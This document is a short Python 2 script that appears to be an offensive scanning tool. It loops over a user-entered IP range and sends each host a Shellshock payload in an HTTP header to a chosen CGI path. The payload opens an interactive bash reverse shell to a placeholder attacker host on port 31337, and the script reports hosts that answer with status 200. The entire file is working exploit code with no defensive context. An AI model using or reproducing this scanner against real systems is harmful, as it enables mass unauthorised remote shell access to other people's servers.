
 
import httplib,urllib
 
print "\n"    
print '\t  Enter The First Three IP ranges To Scan \n'    
url = raw_input(" [Example : 123.456.789] : ")
finput = input("Enter the Starting IP of Range to Scan  : ")
sinput = input("Enter the Ending IP of Range to Scan for : ")
print
     
path = raw_input("Enter Vuln CGI Path : ")
     
for x in range(finput,sinput + 1):
         murl = url + "." + str(x)
         conn = httplib.HTTPConnection(murl)
         reverse_shell='() { :; }; /bin/bash -i >& /dev/tcp/NO-IP/31337 0>&1'
         headers = {"Content-type": "application/x-www-form-urlencoded",
         "test": reverse_shell}
         conn.request("GET",path,headers=headers)
         res = conn.getresponse()
     
         if str(res.status) == '200':
                  print "[+] Website Present and Payload Successfully Sent To " + murl + path
                  data = res.read()
                  print data
         else:
                  print "[!]" + murl + path + " Is Not Vulnerable."